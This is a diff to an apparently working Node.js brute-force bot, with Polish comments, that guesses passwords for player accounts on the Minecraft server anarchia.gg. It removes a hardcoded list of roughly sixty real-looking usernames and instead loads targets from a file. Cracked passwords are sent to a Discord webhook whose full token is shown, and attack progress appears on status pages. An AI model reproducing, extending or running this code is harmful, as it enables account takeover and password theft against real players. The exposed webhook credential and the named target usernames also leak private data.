@@ -6,23 +6,34 @@ import http from 'http';
 const server = { host: 'anarchia.gg', port: 25565 };
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457118913962709012/DnLe-AkG_W9GOp7wR2kJoS36JvL3HHDdIBf-ogrZfN3B6yOxi7-IZYFPanx_qFgJVJZP';
 const PROGRESS_FILE = 'progress.json';
+const USERNAMES_FILE = 'usernames.txt'; // ← NOWY PLIK
 
-// ============ HARDCODED NICKI ============
-const HARDCODED_USERNAMES = [
-    'jestem_sigma212', 'spiewaj', 'maty6615', 'karablox123', 'kaczk12345',
-    'nxenoxn', 'spocuszek_0071', 'Damianxq__', 'szymonekkk17', 'megaknight009',
-    'l3nav', 'Osp_Man', 'Trawa_083', 'CARTOPTICK47168', 'zbieram250mln',
-    'DziadekZbysiek', 'Oddajesz_iteczki', 'masziczopek1112', 'yungmaciassww',
-    'AlanekToSmiec', 'reve_2137', 'berdyszko', 'Kato95', 'Janek2324',
-    'piosenkaomacku', 'Zuzanna__2137', 'kuba_ogro', 'x_szyszek_xx',
-    'groznyjacek21', 'Oliwier001023', 'debilnieuminic5', 'Radek2021',
-    'zdrada67', 'Sucharek_gg', 'paruwka2148', 'fortniteszymonek',
-    'RICk_PL123', 'KotBOB', 'Mroczanek2137', 'Burgerman_66', 'MrlolixPl',
-    'WOJTEKJESTBSAGIM', 'babka_delulu', 'LAZERDIM7235', 'An4lnnT3rr0r',
-    'Kaczorek_69', 'ryszardoo_', 'XX_PONCZEK_XX', 'Anxoszef', 'pawlekq2',
-    'userek21_6', 'PORTORYKANIN', 'Milionowy321', 'h4v0c__', 'PLnigerekkk',
-    'maszproblem2115', 'mumink_2137', 'XAVI22144', 'Gula113'
-];
+// ============ FUNKCJE DO ZARZĄDZANIA NICKAMI ============
+function loadUsernames() {
+    if (fs.existsSync(USERNAMES_FILE)) {
+        return fs.readFileSync(USERNAMES_FILE, 'utf8')
+            .split('\n')
+            .map(line => line.trim())
+            .filter(line => line);
+    }
+    return [];
+}
+
+function removeUsername(username) {
+    try {
+        let usernames = loadUsernames();
+        const before = usernames.length;
+        usernames = usernames.filter(u => u !== username);
+        const after = usernames.length;
+        
+        if (before !== after) {
+            fs.writeFileSync(USERNAMES_FILE, usernames.join('\n'));
+            console.log(`🗑️ [${username}] Usunięto z listy (${before} → ${after} kont)`);
+        }
+    } catch (e) {
+        console.error(`⚠️ Nie można usunąć ${username} z listy:`, e.message);
+    }
+}
 
 // ============ KEEP-ALIVE SERVER ============
 const KEEP_ALIVE_PORT = 3000;
@@ -42,6 +53,7 @@ const keepAliveServer = http.createServer((req, res) => {
     });
     
     const progress = loadProgress();
+    const remainingUsers = loadUsernames();
     const accountsList = Object.entries(progress)
         .map(([nick, data]) => `<li><strong>${nick}</strong>: ${data.lastIndex}/${data.totalPasswords}</li>`)
         .join('');
@@ -58,11 +70,15 @@ const keepAliveServer = http.createServer((req, res) => {
             <h1>🤖 Minecraft Bruteforce Bot</h1>
             <p>✅ Status: <span style="color: #3fb950;">RUNNING</span></p>
             <p>⏱️ Uptime: ${statsData.uptime}s</p>
-            <p>📊 Accounts: ${Object.keys(progress).length}</p>
+            <p>📊 Active accounts: ${Object.keys(progress).length}</p>
+            <p>📋 Remaining: ${remainingUsers.length} kont</p>
             <p>🕐 Last update: ${statsData.lastUpdate}</p>
             <hr>
             <h3>📋 Progress:</h3>
             <ul>${accountsList || '<li>No accounts yet</li>'}</ul>
+            <hr>
+            <h3>🔜 Remaining accounts:</h3>
+            <p style="font-size: 12px;">${remainingUsers.join(', ') || 'Brak'}</p>
             <small style="color: #8b949e;">Auto-refresh every 30s</small>
         </body>
         </html>
@@ -73,10 +89,10 @@ keepAliveServer.listen(KEEP_ALIVE_PORT, () => {
     console.log(`🌐 Keep-alive server on port ${KEEP_ALIVE_PORT}`);
 });
 
-// HTTP SERVER (Fly.io tego wymaga)
 const HTTP_PORT = process.env.PORT || 8080;
 const httpServer = http.createServer((req, res) => {
     const progress = loadProgress();
+    const remainingUsers = loadUsernames();
     const accounts = Object.keys(progress).length;
     res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
     res.end(`
@@ -87,8 +103,10 @@ const httpServer = http.createServer((req, res) => {
             <h1>🤖 Minecraft Bruteforce Bot</h1>
             <p>✅ Status: <strong>RUNNING</strong></p>
             <p>📊 Active accounts: <strong>${accounts}</strong></p>
+            <p>📋 Remaining: <strong>${remainingUsers.length}</strong></p>
             <p>🕐 Uptime: ${process.uptime().toFixed(0)}s</p>
             <hr>
+            <h3>Progress:</h3>
             <pre>${JSON.stringify(progress, null, 2)}</pre>
         </body>
         </html>
@@ -235,7 +253,7 @@ function clearProgress(username) {
         if (progress[username]) {
             delete progress[username];
             fs.writeFileSync(PROGRESS_FILE, JSON.stringify(progress, null, 2));
-            console.log(`🗑️ [${username}] Progress wyczyszczony (znaleziono hasło)`);
+            console.log(`🗑️ [${username}] Progress wyczyszczony`);
         }
     } catch (e) {
         console.error(`⚠️ [${username}] Nie można wyczyścić progress:`, e.message);
@@ -276,15 +294,18 @@ async function bruteforceAccount(username, passwords) {
             console.log(`\n✅ [${username}] ZNALEZIONO! Hasło: ${result.password}`);
             sendToDiscord(username, result.password);
             clearProgress(username);
+            removeUsername(username); // ← USUŃ Z LISTY
             return 'success';
         } else if (result.status === 'premium') {
             console.log(`\n💎 [${username}] Konto premium - STOP`);
+            removeUsername(username); // ← USUŃ Z LISTY
             return 'premium';
         } else if (result.status === 'already_online') {
             console.log(`\n🔄 [${username}] Gracz już online`);
             return 'already_online';
         } else if (result.status === 'not_registered') {
             console.log(`\n🛑 [${username}] Niezarejestrowane - STOP`);
+            removeUsername(username); // ← USUŃ Z LISTY
             return 'not_registered';
         } else if (result.status === 'rate_limited') {
             consecutiveRateLimits++;
@@ -314,6 +335,7 @@ async function bruteforceAccount(username, passwords) {
     }
 
     console.log(`\n❌ [${username}] Nie znaleziono hasła (${passwords.length} prób)`);
+    removeUsername(username); // ← USUŃ Z LISTY (ukończone)
     return 'completed';
 }
 
@@ -522,8 +544,13 @@ async function main() {
     console.log('🚀 MINECRAFT BRUTEFORCE - AUTO MODE');
     console.log('━'.repeat(60));
 
-    // UŻYJ HARDCODED NICKÓW (bez pytania)
-    const usernames = HARDCODED_USERNAMES;
+    // ŁADUJ NICKI Z PLIKU
+    const usernames = loadUsernames();
+    
+    if (usernames.length === 0) {
+        console.log('❌ Brak nicków w usernames.txt!');
+        return;
+    }
     
     console.log(`👥 Załadowano ${usernames.length} kont`);
 
@@ -552,7 +579,6 @@ async function main() {
     
     console.log('━'.repeat(60));
 
-    // Auto-backup co 5 minut
     backupInterval = setInterval(() => {
         backupProgress();
     }, 5 * 60 * 1000);
@@ -576,4 +602,3 @@ main().catch(err => {
     console.error('❌ Błąd krytyczny:', err.message);
     process.exit(1);
 });
-
